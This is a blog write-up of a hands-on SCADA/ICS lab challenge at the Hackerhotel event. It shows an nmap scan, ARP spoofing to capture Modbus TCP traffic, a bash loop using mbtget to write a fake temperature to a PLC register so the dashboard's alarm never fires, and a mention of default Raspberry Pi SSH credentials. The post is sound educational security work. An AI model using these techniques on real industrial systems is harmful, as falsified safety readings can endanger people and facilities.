---
name: Secura SCADA/ICS challenge
date: 2020-02-29
header: 
  teaser: /assets/img/EQ01e4XXkAM7okx.jpg
---

A few weeks ago, I went to the hacking event [Hackerhotel](https://hackerhotel.nl/), and I saw this tweet ([https://twitter.com/djrevmoon/status/1227126257676058624](https://twitter.com/djrevmoon/status/1227126257676058624)) about an interactive SCADA setup with a challenge that would be available during the event. I successfully played the challenge and this is my write-up about it. I should point out that I never used ICS/SCADA systems before doing this challenge.

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">If you are at <a href="https://twitter.com/HotelHacker?ref_src=twsrc%5Etfw">@HotelHacker</a> and want to learn more about SCADA/ICS security, drop by at the <a href="https://twitter.com/SecuraBV?ref_src=twsrc%5Etfw">@SecuraBV</a> guys and girls. We will bring an interactive setup that allows you to hack PLC&#39;s, MitM Modbus etc. without risking setting fire to anything.</p>&mdash; I d໐ຖ&#39;t t3¢hຖ໐ f໐r คຖ คຖŞຟ3r (@djrevmoon) <a href="https://twitter.com/djrevmoon/status/1227126257676058624?ref_src=twsrc%5Etfw">February 11, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

### Setup

The setup consisted of a wooden board to which devices, including a PLC, dashboard, switch, Raspberry Pi and a temperature sensor, were mounted. All devices except for the temperature sensor, which was connected to the Raspberry Pi with USB, were connected to the switch with ethernet cables.

![image-20200229204808487]({{site.url}}/assets/img/image-20200229204808487.png)

The temperature sensor measures the temperature and sends the results to the Raspberry Pi which then sends the temperature results to the PLC, using the [Modbus TCP](https://en.wikipedia.org/wiki/Modbus) protocol, after which the dashboard pulls the temperature results from the PLC. If the temperature is above a certain degrees Celius the dashboard will trigger an alarm which is meant to alarm the factory employees that the temperature is too high.

The goal of the challenge was to adjust the temperature data on the dashboard without triggering the alarm. Normally this setup would be way bigger, in a uranium enrichment facility for example where it would be catastrophic that data are given to the dashboard, and thus displayed to the employees, is incorrect. An example of a big hack involving SCADA systems is [Stuxnet](https://www.wired.com/2014/11/countdown-to-zero-day-stuxnet/).

### Network

I connected to the switch with the static IP-address 192.168.1.221 and executed a port scan on the network:
```bash
nmap -sV -p- -A -oN scan 192.168.1.0/24

# Switch
Nmap scan report for 192.168.1.1
PORT   STATE SERVICE VERSION
22/tcp open  ssh     Dropbear sshd 0.52 (protocol 2.0)
80/tcp open  http    Apache httpd 2.01 ((Linux) mod_ssl/2.9.6 OpenSSL/1.0.2m)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# PLC
Nmap scan report for 192.168.1.101
PORT      STATE SERVICE       VERSION
502/tcp   open  mbap?
44818/tcp open  EtherNet-IP-2
| enip-info:
|   type: Programmable Logic Controller (14)
|   vendor: Rockwell Automation/Allen-Bradley (1)
|   productName: 2080-LC50-24QBB
|   serialNumber: 0x60d182bb
|   productCode: 139
|   revision: 12.11
|   status: 0x0034
|   state: 0x03
|_  deviceIp: 192.168.1.101

# Dashboard
Nmap scan report for 192.168.1.103
PORT      STATE SERVICE       VERSION
502/tcp   open  mbap?
5900/tcp  open  vnc           VNC (protocol 3.8)
| vnc-info:
|   Protocol version: 3.8
|   Security types:
|     VNC Authentication (2)
|     Tight (16)
|   Tight auth subtypes:
|_    STDV VNCAUTH_ (2)
44818/tcp open  EtherNet-IP-2
| enip-info:
|   type: Human-Machine Interface (24)
|   vendor: Rockwell Automation/Allen-Bradley (1)
|   productName: 2711R-T4T/B
|   serialNumber: 0x6000687a
|   productCode: 148
|   revision: 5.12
|   status: 0x0034
|   state: 0x02
|_  deviceIp: 192.168.1.103

# Raspberry Pi
Nmap scan report for 192.168.1.104
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Raspbian 10+deb9u3 (protocol 2.0)
| ssh-hostkey:
|   2048 4a:92:cf:14:2d:84:26:5c:d4:ad:18:ce:0c:29:55:c8 (RSA)
|   256 6d:a4:1a:cd:4d:e5:ec:91:8a:03:2a:16:cb:ae:0d:82 (ECDSA)
|_  256 9e:d9:28:6c:16:58:fe:72:d0:48:e2:a8:e7:b2:8a:81 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

To better understand the Modbus TCP protocol I used `arpspoof` to spoof between the Raspberry Pi, the PLC and the dashboard. This could be easier done by logging in to the Switch (192.168.1.1) and enabling port mirroring.

The following packet was intercepted by ARP spoofing between the Raspberry Pi and the PLC:

![image-20200229212345199]({{site.url}}/assets/img/image-20200229212345199.png)

The Modbus TCP packet writes data to a single register with reference number 1 and the data `41b4` in decimal `16820`.

The following packet was intercepted by ARP spoofing between the dashboard and the PLC:

![image-20200229214151383]({{site.url}}/assets/img/image-20200229214151383.png)

The Modbus TCP packet sends a response of all registers of the PLC to the dashboard, but register 1 is used by the dashboard to determine the temperature.

Now I have all the data to execute an attack and fool the dashboard.

### Attack method

With the program [mbtget](https://github.com/sourceperl/mbtget) I could send a Modbus TCP packet over ethernet. The following script sends the value `16000` to register `1` on the PLC in a while loop. I cannot remember which value I used in the script, but I thought it was around 16000.

```bash
kali@kali:~$ cat loop.sh
#!/bin/bash

while true
do
mbtget -w6 16000 -a 1 192.168.1.101
done
kali@kali:~$ ./loop.sh
word write ok
[...]
```

While executing the script the dashboard showed a fake temperature of around 15 degrees Celius while the actual temperature was much higher. I also wanted to arpsoof the Raspberry Pi during the attack preventing it from sending data to the PLC while I was at the same time sending data to the PLC, but I didn’t have enough time because another talk started at Hackerhotel.

This attack could be easier done by just logging in to the Raspberry Pi with the standard credentials `pi:raspberry` over SSH and adjusting the code that sends the temperature to the PLC. But that isn't fun and I wanted to learn more about Modbus TCP.  In conclusion, it was a fun challenge because I learned more about ICS/SCADA systems.

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Playing with SCADA <a href="https://twitter.com/HotelHacker?ref_src=twsrc%5Etfw">@HotelHacker</a> <a href="https://t.co/lME5olzoIT">pic.twitter.com/lME5olzoIT</a></p>&mdash; Zawadi Done (@ZawadiDone) <a href="https://twitter.com/ZawadiDone/status/1228697086985691136?ref_src=twsrc%5Etfw">February 15, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
